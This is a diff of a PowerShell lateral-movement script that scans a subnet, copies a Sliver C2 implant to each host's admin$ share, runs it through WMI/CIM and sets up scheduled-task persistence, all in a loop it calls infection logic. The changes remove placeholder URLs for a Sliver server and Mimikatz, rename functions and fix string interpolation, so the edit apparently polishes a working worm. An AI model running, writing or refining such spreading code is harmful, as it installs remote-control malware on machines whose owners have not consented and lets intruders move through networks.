@@ -5,10 +5,6 @@
 # --- Configuration ---
 # Path to the payload executable on the machine running this script
 $payloadPath = ".\sliver_payload.exe"
-# URL for Sliver C2 payload (example, not used directly for copying local payload)
-$sliver_URL = "http://<YOUR_SLIVER_SERVER_IP>/sliver_payload.exe"
-# URL for Mimikatz (example, not used directly in this version)
-$mimikatz_URL = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
 
 # Network configuration
 $baseIp = "192.168.56."
@@ -57,7 +53,7 @@ function Test-SmbConnection {
         return $true
     }
     catch {
-        Write-Log "Error testing SMB connection to $IpAddress: $($_.Exception.Message)" "ERROR"
+        Write-Log "Error testing SMB connection to ${IpAddress}: $($_.Exception.Message)" "ERROR"
         return $false
     }
 }
@@ -84,7 +80,7 @@ function Copy-Payload {
         return $true
     }
     catch {
-        Write-Log "Failed to copy payload to $IpAddress: $($_.Exception.Message)" "ERROR"
+        Write-Log "Failed to copy payload to ${IpAddress}: $($_.Exception.Message)" "ERROR"
         # Specific check for network path not found
         if ($_.Exception.Message -like "*Network path not found*") {
             Write-Log "The admin$ share on $IpAddress might not be accessible or does not exist." "WARNING"
@@ -94,26 +90,26 @@ function Copy-Payload {
 }
 
 # Function to execute payload remotely using WMI
-function Execute-PayloadWmi {
+function Start-PayloadWmi {
     param (
         [string]$IpAddress,
         [string]$PayloadPathOnTarget
     )
-    Write-Log "Attempting to execute payload $PayloadPathOnTarget on $IpAddress via WMI..."
+    Write-Log "Attempting to start payload $PayloadPathOnTarget on $IpAddress via WMI..."
     try {
         # Using Invoke-CimMethod for modern PowerShell if available, otherwise fallback to WMI
         Invoke-CimMethod -ComputerName $IpAddress -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $PayloadPathOnTarget} -ErrorAction Stop
-        Write-Log "Payload execution command sent to $IpAddress via CIM."
+        Write-Log "Payload start command sent to $IpAddress via CIM."
         return $true
     }
     catch {
-        Write-Log "Failed to execute payload on $IpAddress via CIM/WMI: $($_.Exception.Message)" "ERROR"
+        Write-Log "Failed to start payload on $IpAddress via CIM/WMI: $($_.Exception.Message)" "ERROR"
         return $false
     }
 }
 
 # Function to establish persistence using a Scheduled Task
-function Establish-Persistence {
+function Set-Persistence {
     param (
         [string]$IpAddress,
         [string]$PayloadPathOnTarget
@@ -146,7 +142,7 @@ function Establish-Persistence {
         return $true
     }
     catch {
-        Write-Log "Failed to establish persistence on $IpAddress: $($_.Exception.Message)" "ERROR"
+        Write-Log "Failed to establish persistence on ${IpAddress}: $($_.Exception.Message)" "ERROR"
         return $false
     }
 }
@@ -183,12 +179,12 @@ for ($i = $startIp; $i -le $endIp; $i++) {
         # 2. Infection Logic: Copy payload
         if (Copy-Payload -IpAddress $currentTargetIp -LocalPayload $payloadPath -RemotePayloadDestPath $remotePayloadPath) {
 
-            # 3. Infection Logic: Execute payload
-            if (Execute-PayloadWmi -IpAddress $currentTargetIp -PayloadPathOnTarget $remotePayloadPath) {
-                Write-Log "Payload executed on $currentTargetIp."
+            # 3. Infection Logic: Start payload
+            if (Start-PayloadWmi -IpAddress $currentTargetIp -PayloadPathOnTarget $remotePayloadPath) {
+                Write-Log "Payload started on $currentTargetIp."
 
                 # 4. Persistence
-                if (Establish-Persistence -IpAddress $currentTargetIp -PayloadPathOnTarget $remotePayloadPath) {
+                if (Set-Persistence -IpAddress $currentTargetIp -PayloadPathOnTarget $remotePayloadPath) {
                     Write-Log "Persistence established on $currentTargetIp."
                 } else {
                     Write-Log "Failed to establish persistence on $currentTargetIp." "WARNING"
@@ -205,7 +201,7 @@ for ($i = $startIp; $i -le $endIp; $i++) {
                     Start-Sleep -Seconds $infectionDelaySeconds
                 }
             } else {
-                Write-Log "Failed to execute payload on $currentTargetIp." "WARNING"
+                Write-Log "Failed to start payload on $currentTargetIp." "WARNING"
             }
         } else {
             Write-Log "Failed to copy payload to $currentTargetIp." "WARNING"
